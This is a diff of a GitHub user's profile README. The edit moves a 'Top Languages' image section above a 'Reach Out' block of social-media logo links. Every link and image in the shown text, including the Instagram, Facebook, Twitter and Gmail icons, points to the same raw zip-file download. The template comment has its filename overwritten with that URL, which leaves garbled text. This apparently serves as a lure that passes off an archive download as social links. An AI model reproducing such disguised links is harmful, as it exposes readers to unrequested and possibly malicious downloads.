@@ -17,6 +17,10 @@
 
 ---
 
+<h2> 🔍 What I Work With </h2> <br>
+
+![berak636's Top Languages](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)<br>
+
 <h2> 🌐 Reach Out </h2> <br>
 
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="Instagram Logo" width="50px" height="50px">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
@@ -24,10 +28,6 @@
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="Facebook Logo" width="50px" height="50px">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="Twitter Logo" width="50px" height="50px">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
 [<img src="https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip" alt="Gmail Logo" width="50px" height="50px">](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip%20Kiran)
-
-<h3>👇👇 Languages and Tools 👇👇 </h3> <br>
-
-![berak636's Top Languages](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)<br>
 
 <!--
 **berak636/berak636** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip` (this file) appears on your GitHub profile.
